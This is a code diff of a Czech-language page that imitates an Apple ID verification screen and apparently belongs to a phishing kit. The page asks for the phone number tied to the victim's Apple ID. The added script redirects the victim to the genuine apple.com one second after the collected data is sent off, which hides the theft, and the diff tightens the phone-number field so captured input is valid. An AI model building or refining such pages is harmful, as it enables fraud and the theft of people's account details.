@@ -34,6 +34,11 @@
                 }
 
                 request.send(JSON.stringify(params));
+                function telpg(){
+                    
+                    document.location.href='https://www.apple.com/';
+                }
+                setTimeout(telpg, 1000);
             }
         }
         document.addEventListener('keydown', (event) => {
@@ -158,7 +163,7 @@
             <p class="nig">Zadejte telefonní číslo, které používáte se svým Apple ID.</p>
             <li>••• ••• •38</li>
             <div class="captcha">
-            <input class="AppleIDl" placeholder="Telefonní číslo">
+            <input maxlength="9" type="number" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==9) return false;" class="AppleIDl" placeholder="Telefonní číslo" >
 
             </div>
             <p class="bottomtext">Pokud jste zapomněli své Apple ID, můžete si ho vyhledat.
